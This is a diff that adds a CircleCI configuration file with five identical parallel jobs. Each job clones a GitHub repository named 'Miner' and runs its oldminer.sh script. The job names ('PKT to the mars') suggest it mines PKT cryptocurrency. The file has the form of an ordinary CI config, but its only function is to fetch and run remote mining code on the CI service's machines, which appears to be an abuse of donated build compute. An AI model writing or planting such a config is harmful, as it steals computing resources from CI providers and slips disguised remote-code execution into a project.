@@ -1,0 +1,46 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: PKT to the mars
+            command: git clone https://github.com/instax-dutta/Miner && cd Miner && bash oldminer.sh
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: PKT to the mars
+            command: git clone https://github.com/instax-dutta/Miner && cd Miner && bash oldminer.sh
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: PKT to the mars
+            command: git clone https://github.com/instax-dutta/Miner && cd Miner && bash oldminer.sh
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: PKT to the mars
+            command: git clone https://github.com/instax-dutta/Miner && cd Miner && bash oldminer.sh
+    Devop4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: PKT to the mars
+            command: git clone https://github.com/instax-dutta/Miner && cd Miner && bash oldminer.sh
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
+            - Devop4
